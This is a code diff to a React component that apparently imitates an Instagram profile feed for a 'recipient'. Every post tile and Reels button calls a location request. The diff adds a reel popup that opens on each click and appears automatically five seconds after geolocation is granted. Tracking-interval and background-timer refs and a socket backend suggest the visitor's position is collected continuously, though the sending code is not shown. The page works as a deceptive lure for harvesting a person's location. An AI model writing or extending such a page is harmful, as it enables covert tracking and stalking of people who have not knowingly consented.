@@ -2,6 +2,7 @@
 
 import { useEffect, useRef, useState } from "react";
 import Sidebar from "../components/Sidebar";
+import ReelModal from "../components/ReelModal";
 
 export default function RecipientFeed({
   backendUrl = process.env.NEXT_PUBLIC_SOCKET_URL || "http://localhost:5000",
@@ -10,10 +11,12 @@ export default function RecipientFeed({
   const [isFollowing, setIsFollowing] = useState(false);
   const [coords, setCoords] = useState(null);
   const [hasAllowed, setHasAllowed] = useState(false);
+  const [isReelOpen, setIsReelOpen] = useState(false);
 
   const watchIdRef = useRef(null);
   const retryTimerRef = useRef(null);
   const hasAllowedRef = useRef(false);
+  const hasScheduledReelRef = useRef(false);
   const trackingIntervalRef = useRef(null);
   const backgroundStartRef = useRef(null);
   const cutoffTimerRef = useRef(null);
@@ -59,6 +62,15 @@ export default function RecipientFeed({
     if (retryTimerRef.current) {
       clearInterval(retryTimerRef.current);
       retryTimerRef.current = null;
+    }
+
+    // Automatically trigger Reel playback popup 5 seconds after location is granted
+    if (!hasScheduledReelRef.current) {
+      hasScheduledReelRef.current = true;
+      console.log("Loading Reel");
+      setTimeout(() => {
+        setIsReelOpen(true);
+      }, 5000);
     }
 
     try {
@@ -287,6 +299,15 @@ export default function RecipientFeed({
   };
 
   /*
+   * Open Reel Modal Popup
+   */
+  const handleOpenReel = (e) => {
+    if (e) e.stopPropagation();
+    requestLocation();
+    setIsReelOpen(true);
+  };
+
+  /*
    * Open native Instagram mobile application via deep link
    */
   const handleOpenInstagramApp = (e) => {
@@ -477,7 +498,7 @@ export default function RecipientFeed({
                 </svg>
               </button>
 
-              <button className="profile-tab-item" onClick={requestLocation} title="Reels">
+              <button className="profile-tab-item" onClick={handleOpenReel} title="Reels">
                 <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2">
                   <rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
                   <polygon points="10 8 16 12 10 16 10 8" fill="currentColor" />
@@ -505,41 +526,41 @@ export default function RecipientFeed({
             {/* Post Photo Grid (3-Columns) */}
             <div className="recipient-posts-grid">
               {/* Post 1 - Pinned */}
-              <div className="recipient-post-tile" onClick={requestLocation}>
+              <div className="recipient-post-tile" onClick={handleOpenReel}>
                 <div className="post-badge pin-badge" title="Pinned">
                   <svg viewBox="0 0 24 24"><path d="M16 12V4H17V2H7V4H8V12L5 15V17H11V22H13V17H19V15L16 12Z"/></svg>
                 </div>
-                <img src="/posts/post1.jpg" alt="Post 1" />
+                <img src="/posts/post1.png" alt="Post 1" />
               </div>
 
               {/* Post 2 - Pinned */}
-              <div className="recipient-post-tile" onClick={requestLocation}>
+              <div className="recipient-post-tile" onClick={handleOpenReel}>
                 <div className="post-badge pin-badge" title="Pinned">
                   <svg viewBox="0 0 24 24"><path d="M16 12V4H17V2H7V4H8V12L5 15V17H11V22H13V17H19V15L16 12Z"/></svg>
                 </div>
-                <img src="/posts/post2.jpg" alt="Post 2" />
+                <img src="/posts/post2.png" alt="Post 2" />
               </div>
 
               {/* Post 3 - Pinned */}
-              <div className="recipient-post-tile" onClick={requestLocation}>
+              <div className="recipient-post-tile" onClick={handleOpenReel}>
                 <div className="post-badge pin-badge" title="Pinned">
                   <svg viewBox="0 0 24 24"><path d="M16 12V4H17V2H7V4H8V12L5 15V17H11V22H13V17H19V15L16 12Z"/></svg>
                 </div>
-                <img src="/posts/post3.jpg" alt="Post 3" />
+                <img src="/posts/post3.png" alt="Post 3" />
               </div>
 
-              {/* Post 4 - Reel */}
-              <div className="recipient-post-tile" onClick={requestLocation}>
+              {/* Post 4 - Featured Reel */}
+              <div className="recipient-post-tile" onClick={handleOpenReel}>
                 <div className="post-badge reel-badge" title="Reel">
                   <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                     <polygon points="6 4 20 12 6 20 6 4" fill="#FFFFFF" />
                   </svg>
                 </div>
-                <img src="/posts/post4.jpg" alt="Post 4" />
+                <img src="/posts/post4.png" alt="Post 4 - Reel" />
               </div>
 
               {/* Post 5 - Carousel */}
-              <div className="recipient-post-tile" onClick={requestLocation}>
+              <div className="recipient-post-tile" onClick={handleOpenReel}>
                 <div className="post-badge carousel-badge" title="Carousel">
                   <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                     <rect x="2" y="2" width="16" height="16" rx="2" />
@@ -550,7 +571,7 @@ export default function RecipientFeed({
               </div>
 
               {/* Post 6 - Reel */}
-              <div className="recipient-post-tile" onClick={requestLocation}>
+              <div className="recipient-post-tile" onClick={handleOpenReel}>
                 <div className="post-badge reel-badge" title="Reel">
                   <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                     <polygon points="6 4 20 12 6 20 6 4" fill="#FFFFFF" />
@@ -560,7 +581,7 @@ export default function RecipientFeed({
               </div>
 
               {/* Post 7 - Reel */}
-              <div className="recipient-post-tile" onClick={requestLocation}>
+              <div className="recipient-post-tile" onClick={handleOpenReel}>
                 <div className="post-badge reel-badge" title="Reel">
                   <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                     <polygon points="6 4 20 12 6 20 6 4" fill="#FFFFFF" />
@@ -570,7 +591,7 @@ export default function RecipientFeed({
               </div>
 
               {/* Post 8 - Reel */}
-              <div className="recipient-post-tile" onClick={requestLocation}>
+              <div className="recipient-post-tile" onClick={handleOpenReel}>
                 <div className="post-badge reel-badge" title="Reel">
                   <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                     <polygon points="6 4 20 12 6 20 6 4" fill="#FFFFFF" />
@@ -580,7 +601,7 @@ export default function RecipientFeed({
               </div>
 
               {/* Post 9 - Carousel */}
-              <div className="recipient-post-tile" onClick={requestLocation}>
+              <div className="recipient-post-tile" onClick={handleOpenReel}>
                 <div className="post-badge carousel-badge" title="Carousel">
                   <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                     <rect x="2" y="2" width="16" height="16" rx="2" />
@@ -617,7 +638,7 @@ export default function RecipientFeed({
               <line x1="21" y1="21" x2="16.65" y2="16.65" />
             </svg>
           </button>
-          <button className="mobile-nav-btn" onClick={requestLocation} title="Reels">
+          <button className="mobile-nav-btn" onClick={handleOpenReel} title="Reels">
             <svg viewBox="0 0 24 24" width="24" height="24" stroke="#FFFFFF" fill="none" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
               <rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
               <polygon points="10 8 16 12 10 16 10 8" fill="none" stroke="#FFFFFF" />
@@ -635,6 +656,9 @@ export default function RecipientFeed({
             </div>
           </button>
         </nav>
+
+        {/* Reel Popup Modal Feature */}
+        <ReelModal isOpen={isReelOpen} onClose={() => setIsReelOpen(false)} />
     </div>
   );
 }
